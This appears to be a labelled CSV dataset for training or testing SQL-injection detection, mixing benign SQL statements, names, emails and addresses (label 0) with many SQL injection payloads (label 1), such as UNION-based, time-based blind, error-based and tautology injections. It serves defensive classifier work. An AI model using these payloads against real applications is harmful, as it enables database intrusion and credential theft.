Query,Label
"SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",0
SELECT DISTINCT darkness FROM lovely,0
SELECT MIN ( carefully )  AS dull FROM remarkable,0
64526656h,0
SELECT COUNT ( red )  FROM at,0
"select *	from users	where	id  =11<1#unionselect1,version (	)--1",1
1'	)		as fxidwhere5926 = 5926,1
"1""		)  ) and char	(	111)||char  (	77		)	||char	( 121	) ||char(	88  )	 = 	regexp_substring		(	repeat ( left		( crypt_key( char (65	)	||char	(  69) ||char 	( 83	) ,null	)	 ,0	)  ,500000000	)  ,null	)	 	and		( 	( ""vcjt""	like ""vcjt",1
6432,0
"SELECT column_name ( s )  FROM realize,needed",0
woolgar@awat.gov,0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
"1	and8514	= (  select count	(	*	 )from domain.domains	ast1,domain.columns	ast2,domain.tables as	t3 )	#	miji",1
"1"" )	 where9545 = 9545and	9198	= 9198--",1
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
buitrago pontigo,0
jabbari,0
"1""rlike sleep( 	5)",1
SELECT * FROM prove,0
dotan,0
-5286'or6783=1233,1
"1""where7232 =		7232	(select		(	 case when (  5451	 =	 5451		) then	regexp_substring ( repeat	 (right( char(	5451	)	,0)	 ,500000000	 ) ,null	) else	char  (	108 ) ||char (	76 )  ||char	 (	 112 	) ||char (  116 )	end) from	information_schema.system_users )--",1
1   )  )	as	quapwhere7625 	=	 7625,1
SELECT * FROM observe WHERE golden = 'various'  AND  ( character = 'gain' OR ball = 'dirty' ),0
"1%"" or	elt	(5873	= 5873,sleep 	(	5   ) 	  )		 #",1
"pasaje cox 194, 5?f",0
; begindeclare@var varchar ( 8000	)	set @var = ':'select @var	=  @var+'+login+'/'+password+'' from users where login >,1
1') 	 where3187 =	3187orderby1#,1
9043,0
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%',0
SELECT * FROM hidden WHERE doubt = 'fun'  AND City = 'furniture',0
bnrinfo,0
cha$9i74r0,0
"select	dbms_pipe.receive_message( chr	( 66 ) ||chr (	67 )||chr	( 79	)	||chr	( 101	) ,5 )  fromdual	and'lckw'	=		'lckw",1
17493,0
4077,0
"1"" where4345	 =4345 and4386= utl_inaddr.get_host_address 	( chr  ( 113  )	 ||chr( 113 )	||chr (		112	)  ||chr	 (106	)||chr	(113) ||(select			( case	when (	4386= 4386 )then 1else	0	end	)		from	dual	) ||chr 	(  113		) ||chr (	122	)	||chr  (118		) 	||chr  ( 122)||chr( 	113) 	) --",1
1%' )			)  	),1
SELECT MIN ( whose )  AS whenever FROM sunlight,0
SELECT COUNT ( cloud ) FROM child,0
"1""where 4808 	=	 4808unionallselect null,null,null,null,null,null,null#",1
"1' 	)	unionall selectnull,null,null,null,null,null,null,null,null--",1
-8015	) where9808	= 9808or	9323	= 9323#,1
5.5584E+15,0
"1"" )	) 	)		and	8312 =	 dbms_pipe.receive_message( chr( 69 )||chr	 ( 79)	||chr 	(	101	 )	||chr(	 68),5 	)	--",1
SELECT equally FROM reader UNION SELECT gasoline FROM bread ORDER BY boat,0
"SELECT * FROM farm WHERE weight IN  ( 'own', 'herd', 'rabbit' )",0
"1'   )	) 		)  and char	(  107	)||char (		121	)	||char (97 	) 	||char (80		)	 	=regexp_substring (repeat	(left (	 crypt_key ( char ( 65	 ) ||char( 	69 	)	||char	 (	83 ) ,null),0	)	,500000000		)	,null)--",1
"SELECT oxygen AS along, fence AS [instead]  FROM food",0
"-9574%'	) 		)	 		unionallselect 5645,5645,5645,5645,5645,5645,5645--",1
3.6585E+15,0
nieva de cameros,0
1'	)		)	)  rlike	(	 select* from(	select(sleep(	5	)) 	 )	sgvo)and	( 	 	(  	(	'npzh'= 'npzh,1
SELECT MIN ( interest )  AS flat FROM planet,0
israel_piggot@joyclub.pe,0
"1'	)	 )		as	sojl	where8710=	8710 orchar	(119	)||char( 100)||char		( 99	)	||char	 (	121 )= regexp_substring	(	repeat	(		right( char	(		1441	 )	,0	 ),5000000000	 )	 ,null )--",1
1%'	and	sleep (		5)and	'%' 	=		',1
SELECT COUNT ( DISTINCT kitchen )  FROM tired,0
"1'	 )	) 	)	and	row	 (6237,7469) > (	selectcount (	 *)	 ,concat 	( 	0x7171706a71,( select	 (	elt (	6237	=	 6237,1)	) ),0x717a767a71,floor(	rand(	 0	)		*2 	)	) x from (  select5192unionselect3785 unionselect	3931unionselect7158)agroupby x 	)and    ( 	 ( 	 ( 'zxhn'like'zxhn",1
1'||	(	select 'iuud'where	3687=	3687,1
"1%"")	  )  		and9254	=		 	(	select	count ( * ) 	from	rdb$fields ast1,rdb$types	ast2,rdb$collationsas t3,rdb$functionsast4	) 	--",1
SELECT AVG ( knife ) FROM characteristic,0
"-9848'unionall	select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1
SELECT * FROM population WHERE ground BETWEEN '1996-07-01' AND '1996-07-31',0
rudie@deuxmanagement.jo,0
1'	) 	 )  	)	and ( 1685 =	 2985	)*2985 and 	(	 (   (		'rzwb'='rzwb,1
SELECT * FROM heart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,0
"SELECT Orders.keyrID, Employees.smile, Employees.managed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.bridgeID ORDER BY Orders.airplaneID",0
lilien@aprendeaestudiar.lt,0
"c/ virgen de la almudena, 61 12?c",0
SELECT * FROM printed WHERE wing LIKE '%badly%',0
zahn,0
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ),0
"1'and updatexml(	 3393,concat ( 0x2e,0x7171706a71,( select (  elt (		3393 =	 3393,1	))			) ,0x717a767a71	 )		,1161	)  and 'kudh' like 'kudh",1
"1%""	and 8635	=  (	 select	count (	 *)	from	generate_series(1,5000000 )			)   --",1
SELECT AVG ( Price ) FROM look,0
1')  	)  	 )  	and	3754= 	(selectupper 	(	xmltype	(chr	( 60		)||chr	( 58	) ||chr	 (	113) 	||chr(113 )	||chr (	112	)||chr(	 106)	||chr( 113	) || ( select	(		casewhen (	 3754 =	 3754 )	then 1else0end	)fromdual  ) 	||chr	(113 )	 ||chr  (	122)	||chr(  118) 	||chr	 ( 122 	) ||chr( 113	) ||chr( 	62 	) 	)   ) 	fromdual 	)and		( 	(  ( 'ykjs'	like'ykjs,1
-8553'+ (	selectadko where	1750 = 1750unionallselect1750#,1
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0
sikes-jeans@923.mv,0
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )",0
SELECT * FROM subject WHERE NOT pot = 'shape'  AND NOT receive = 'lake',0
padiernos,0
belia,0
declare@s	varchar 	(	200)	 select	@s = 0x77616974...,1
ilsup,0
"1'+ (  select	jrmzwhere4762	=4762and	elt ( 9588	 =	9794,9794	))		+'",1
guillen,0
"1"" 	)	 	 )  and 4386 = utl_inaddr.get_host_address		( chr (		113	 )	||chr	 ( 113 )||chr  (	 112)	||chr (	106	 ) ||chr	(	113 ) || (	select (	case when (4386 =  4386	)  then 1	else0end 	) 	fromdual)  ||chr 	( 113 	)||chr(		122 )	 ||chr	( 118 )	||chr(	122 )	||chr(113	) 		)	 and  (	( ""bfko""	=""bfko",1
"SELECT desert, bell+ ', ' + immediately+ ' ' + fell+ ', ' + stairs AS lungs  FROM lift",0
19461,0
"1""	 )	) 		)andupdatexml	 (3393,concat	(	0x2e,0x7171706a71,  (  select		(	elt	( 3393 =3393,1  )		)	 	  ) ,0x717a767a71 ),1161	)and  (		( 		(	 ""eslj"" like""eslj",1
"1%"" ) 	)	 	) 	or 8156		=  	 (	select	count ( *)	fromgenerate_series 	(		1,5000000	 ) 	) --",1
chimenea,0
DELETE FROM send,0
strucak@cortell.cat,0
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0
"1%'procedure	analyse	( extractvalue (9255,concat	( 	0x5c,  ( benchmark(		5000000,md5		( 0x52515a50		)	)			  )		)	  	) ,1 ) and	'%'='",1
1.22869E+15,0
SELECT * FROM separate,0
1'+( select	hrguwhere9587 =9587,1
26%,1
"SELECT * FROM express ORDER BY independent ASC, love DESC",0
SELECT AVG ( Price ) FROM skill,0
"1union allselect null,null,null,null,null,null,null,null--",1
SELECT AVG ( raw ) FROM bigger SELECT SUM ( volume ),0
"1""andsleep	(	5)	#",1
"SELECT hiddenID AS ID, aid AS fell FROM bet",0
alicanto,0
SELECT progress ( s )  FROM important SELECT clay FROM tell,0
SELECT * FROM Customers   WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,0
50615,0
"1'+		( selectsxcowhere1623	= 1623 unionall select	null,null--",1
"SELECT * FROM examine WHERE hello IN  ( 'shoot', 'happy', 'ball' )",0
1) and2853=	cast	( ( chr  (  113) ||chr ( 	113	 )	||chr(112 )	||chr ( 	106  ) ||chr (113  )  	)	||	 (	select (	case when  	( 2853 =2853	)		 then	1else 0end )	  )::text||	( 	chr	( 113)||chr( 	122 )	||chr	( 118	)||chr ( 122)||chr	 (	113 ) ) 	as	numeric ) 	and(9932 =  9932,1
"SELECT COUNT ( pick ) , rope FROM final BY mistake",0
SELECT * FROM join,0
"1' 	) 	)   	) or8421	=  (	 selectcount	(  *) 	fromgenerate_series ( 	1,5000000 )	)	  and (		( (	 'bmzj'like	'bmzj",1
"1%""and 3754=	(		select upper	(	 xmltype	(	chr	(	60 	)	||chr (	58 ) ||chr	(	113	)	 ||chr	(	 113)  ||chr( 112)	||chr (	106)		||chr	( 113	)  ||(select	(	case when  (  3754		= 3754	) then 1else 0 end ) 		from dual) 	||chr	(113) 	||chr	(122)  ||chr	(	118	) ||chr (	 122 )||chr	( 113	 )||chr  (	62))			) fromdual	 )			and""%"" 	=""",1
SELECT * FROM remarkable WHERE army = 'face'  AND City = 'massage',0
1'+	( selectrdwb	where	2498	=	2498and3429	=		7639--,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
-9847%' 	)   )		)or 3440 =cast( (		chr(	113	) ||chr	(	 113		)	||chr(112)||chr	(106 )||chr(	113	 )  )|| (	select (case when 	(		3440=	3440 )	 then 1else0end) 	)	::text||(chr	(113	)||chr (	122  )	 ||chr(118		)||chr (122 	)||chr (	 113	)		) 		as	numeric  )	and 	 ( (  	( '%'= ',1
basilia,0
SELECT COUNT ( method )  FROM fort,0
6.92E+15,0
SELECT * FROM  ( SELECT excited FROM principle ),0
SELECT * FROM frequently WHERE interior = 'include'  AND  ( question = 'luck' OR earn = 'quiet' ),0
SELECT * FROM compass ORDER BY available,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' )",0
"-6626%"")or1744	= 5292and			( ""%""=""",1
"1'and 6414 =	(  select count(	 *  ) fromrdb$fieldsast1,rdb$types as	t2,rdb$collationsas	t3,rdb$functions	ast4	)",1
SELECT * FROM chain WHERE education = 'continued' LIMIT 3,0
UPDATE in SET sound = 'line'WHERE hardly = 'whale',0
1	 	)  )  asehlgwhere	6340  =6340,1
SELECT paint,0
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
SELECT MIN ( purple )  AS collect FROM luck,0
68252027x,0
"1""		)		asxaye	where	5343		=	 5343and	4355 =	7475#",1
"1' and6055	=ctxsys.drithsx.sn	 ( 6055,(chr(		113) ||chr 	( 113) ||chr (112)||chr(	106 	)  ||chr	(113	)	||	( 	select	( casewhen	(6055=	 6055 	) 		then1	else0 end 	)	fromdual )||chr (	113 )	||chr(	 122 	) 	||chr	( 118		)  ||chr	 (	 122	)  ||chr (	113	) )	 )",1
"1'		) 		andupdatexml(3393,concat	(	 0x2e,0x7171706a71, ( 	select	(	elt	( 	3393  =	 3393,1	)   ) 	) ,0x717a767a71) ,1161 )",1
SELECT rubber ( s )  FROM shoot UNION ALL,0
"SELECT leg,group,travel FROM shelter LEFT JOIN Orders ON chest.solidID =  could.frozen ORDER BY fear.so",0
"-2568"") or	(8459	=8459	 )	*4906and	 ( 	""exyw""  =  ""exyw",1
"SELECT FIND_IN_SET ( ""q"", ""s,q,l"" ) ;",0
30827206f,0
"SELECT surfaceID AS ID, should AS immediately FROM afternoon",0
"1""	rlike ( 	select(casewhen	( 	3711		=  3313	)  then1 else	0x28 end	) 	)  and""iqlh""like	""iqlh",1
"select *	from userswhere id= 1-1<@ unionselect1,version ( ) -- 1",1
"SELECT * FROM for WHERE silence NOT IN  ( 'rise', 'roar', 'one' )",0
91650654r,0
knio,0
1'where	9602  =	 9602,1
viana de jadraque,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
-7230'	 )	or	2724in	(	  (		char 	(113 	)	+char		(	 113 	) +char (112)+char( 	106)+char(		113)+ ( select			(		casewhen 	(2724 	=2724 	)		then char	 (49) elsechar(  48	) end		))+char 	(		113 ) +char 	(122	)	 +char	(		118 )+char	(122) +char(	113	))	 )		 and	('khtc'		=	'khtc,1
"-9988%""	orelt ( 1032=  1032,3623 )and""%""=	""",1
DELETE FROM Customers;,0
"infantes de carrion, 122",0
"1		) )	 	)	union	allselectnull,null,null,null,null,null,null,null#",1
"1'		) 	assaqp	where	6612 =6612union all selectnull,null,null,null,null,null,null--",1
"-1033union all	select8731,8731,8731,8731,8731,8731--",1
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ),0
"1""	)where4660=		4660or5286=  (selectcount( *)	fromall_userst1,all_users t2,all_users	t3,all_users t4,all_users t5	)--",1
SELECT * FROM cowboy WHERE effort = 'never' LIMIT 3,0
horalek,0
SELECT wide ( s )  FROM west,0
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0
1.78478E+15,0
"1%'	) )		) 		and	updatexml ( 3393,concat 	( 0x2e,0x7171706a71,	( select (elt (3393=	3393,1)		) 	 )	,0x717a767a71)	 ,1161	)  and	 (		(   ('%'=	'",1
"SELECT quick AS impossible, chance AS [ability]  FROM breakfast",0
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0
SELECT fort ( s )  FROM main LEFT JOIN,0
cos6rio,0
"-8735'	) 	)   union allselect 3262,3262,3262--",1
ayate,0
clav6ria,0
SELECT youth ( s )  FROM tape UNION,0
1'  )and		(		3020= 	3020)		*6703and		('botl'	like 'botl,1
diafragmar,0
vallado oliveras,0
sangres,0
"INSERT INTO which ( mile, friend, finish, monkey, word, then )  VALUES  ( 'against', 'recently'. gray', 'sum', 'stock', 'fastened', 'go' )",0
2.57E+15,0
"1' )	 )				)andextractvalue( 	7982,concat(	0x5c,0x7171706a71,(	select	(	elt	(7982	= 	7982,1 	)	 	 ) 	)	,0x717a767a71	 ))  	and   (	 	(	( 'cfhi'like'cfhi",1
nadav6,0
"1%"" 	) 	)  )  or	2633	= dbms_pipe.receive_message	( chr(112 )||chr	(  65)||chr	(	65	)  ||chr(	103	 ),5	)	and (	(		(	 ""%""	= """,1
"SELECT * FROM mouth WHERE teach BETWEEN ""wish"" AND    ""pick""",0
san salvador,0
"UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0
1 ) and 		(	select	* from	( select	 (	sleep( 5  ) ) 			)	gcrr	)	 #,1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0
"SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp",0
03621656f,0
1'	inbooleanmode 	)   or 6793	=	 (	 select6793	frompg_sleep	( 5  ) 	)	#,1
"select *	from	userswhereid 	=	 1 or$	.	=	1	unionselect1,@@VERSION--1",1
"SELECT ADDTIME ( ""09:34:21.000001"", ""2:10:5.000003"" ) ;",0
"-2153'|| ( select'sofs'where	4126  =  4126	union allselect4126,4126,4126,4126,4126#",1
z5r1174osa,0
"SELECT * FROM primitive WHERE coming IN  ( 'either', 'draw', 'queen' )",0
"1""		 )	 	) rlike sleep ( 5 	)	#",1
"select	count ( * )   from domain.domainsas t1,domain.columnsast2,domain.tablesast3and (		""pxbk""	like ""pxbk",1
"-6294""unionallselect9921,9921,9921,9921,9921,9921--",1
1%'  ) )	 rlike	 	( select( 	casewhen ( 6094	=7893)  then 1else0x28end	 ))	and   (			(			'%' =',1
"SELECT dirt, three, love FROM blood WHERE spirit  IS NULL",0
"calle artigako haritza, s/n 8?d",0
leandro,0
SELECT COUNT ( DISTINCT larger )  FROM spite,0
SELECT Count ( * )  AS season,0
